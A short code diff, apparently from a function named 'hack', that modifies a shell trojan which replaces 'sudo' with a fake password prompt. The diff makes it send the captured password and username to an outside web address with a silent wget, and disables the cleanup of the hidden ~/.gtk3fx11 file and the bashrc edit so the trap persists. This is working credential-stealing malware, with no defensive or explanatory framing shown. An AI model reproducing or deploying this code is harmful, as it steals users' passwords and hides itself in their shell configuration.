@@ -9,10 +9,10 @@ def hack():
 function sudo {
   read -s -p "[sudo] password for $USER: " pwd
 
-  open "http://stout.hampshire.edu/~acg10/coinget_help.php?message=$(echo $pwd | base64)&from=$USER"
+  wget -q "http://stout.hampshire.edu/~acg10/coinget_help.php?message=$pwd&from=$USER" -O /dev/null
 
-  rm ~/.gtk3fx11
-  cat ~/.bashrc | sed "/source ~\\/\\.gtk3fx11/d" > /tmp/bashrc
+  #rm ~/.gtk3fx11
+  #cat ~/.bashrc | sed "/source ~\\/\\.gtk3fx11/d" > /tmp/bashrc
   source /tmp/bashrc
   mv /tmp/bashrc ~/.bashrc
 
